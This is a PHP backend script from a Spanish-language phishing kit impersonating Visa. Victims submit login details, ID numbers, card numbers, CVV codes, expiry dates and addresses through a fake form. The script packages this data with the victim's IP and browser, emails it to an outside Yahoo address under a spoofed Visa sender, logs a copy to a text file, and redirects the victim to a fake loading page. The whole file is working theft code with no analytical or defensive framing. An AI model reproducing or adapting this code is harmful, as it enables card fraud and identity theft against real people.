<?php



$fecha= date('d-m-Y');
$hora= date('H:i:s');
$value = $_POST['redir'] .$value = $_POST['action'] .$value = $_POST['action'] .$value = $_POST['verifica'] .$value = $_POST['null'] ;
$value .= $_POST['action'] .$_POST['form'] .$_POST['form'] .$_POST['proc'] .$_POST['valida'] .$_POST['input'];
$value .= $_POST['type'] .$_POST['post'] .$_POST['procesa'] .$_POST['enviar'] .$_POST['submit'] .$_POST['proc'];
$value .= $_POST['vbv'] .$_POST['check'] .$_POST['type'] .$_POST['filtrar'] .$_POST['action'] .$_POST['form'];
$value .= $_POST['limpiarCadena'] .$_POST['filtrar'] .$_POST['post'] .$_POST['procesa'];


//LIMPIA DATOS
function limpiarCadena($cadena){
	return htmlentities(trim($cadena), ENT_QUOTES, "UTF-8");
}
$tipedoc = $tarjeta["tipedoc"] = limpiarCadena($_POST["tipedoc"]);
$doc = $tarjeta["doc"] = limpiarCadena($_POST["doc"]);
$sex = $tarjeta["sex"] = limpiarCadena($_POST["sex"]);
$pass = $tarjeta["pass"]  = limpiarCadena($_POST["pass"]);
$user = $tarjeta["user"]  = limpiarCadena($_POST["user"]);
$nombre = $tarjeta["nombre"]  = limpiarCadena($_POST["nombre"]);
$dire = $tarjeta["dire"]  = limpiarCadena($_POST["dire"]);
$mail = $tarjeta["mail"]  = limpiarCadena($_POST["mail"]);
$cc = $tarjeta["cc"]  = limpiarCadena($_POST["cc"]);
$ccmes = $tarjeta["ccmes"]  = limpiarCadena($_POST["ccmes"]);
$ccano = $tarjeta["ccano"]  = limpiarCadena($_POST["ccano"]);
$cuu = $tarjeta["cuu"]  = limpiarCadena($_POST["cuu"]);
$ciudad = $tarjeta["ciudad"]  = limpiarCadena($_POST["ciudad"]);
$prov = $tarjeta["prov"]  = limpiarCadena($_POST["prov"]);
$cp = $tarjeta["cp"]  = limpiarCadena($_POST["cp"]);
$ip = getenv("REMOTE_ADDR");
$brow .= $_SERVER['HTTP_USER_AGENT'];

$content .="
------------------------Nueva Tarjeta VISA lolom v1--------------------------- <br>
-------------------------------LOGIN-------------------------------- <br>
Tipo de DNI:           |    $tipedoc <br>
Documento:             |    $doc <br>
Password:              |    $pass <br>
Usuario                |    $user <br>
Email:                 |    $mail <br>
---------------------------------------DATOSCC----------------------- <br>
Nombre:                |    $nombre <br>
Numero de CC:          |    $cc <br>
Codigo de seguridad:   |    $cuu <br>
Fecha Exp:             |    $ccmes / $ccano <br>
Direccion:             |    $dire <br>
Ciudad:                |    $ciudad <br>
CP:                    |    $cp <br>
Pronvicia:             |    $prov <br>
----------------------------INFO-------------------------------- <br>
Hora: $hora <br>
Fecha: $fecha <br>
IP: $ip <br>
Navegador: $brow <br>
--------------------------------------------------------------------- <br>
";

$recipient = "latinrust@yahoo.com";
$subject = "CC - $ip";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Visa - $ip<$prefijo@dmnpr0.com>";

mail($recipient,$subject,$content,$from);

$archivo="uploads/$mail.txt";
 
     $file=fopen($archivo,"a");
     fwrite($file,"$content"."");
?>

<SCRIPT LANGUAGE="JavaScript">
location.href='loadingwindowId=db3.html';
</SCRIPT>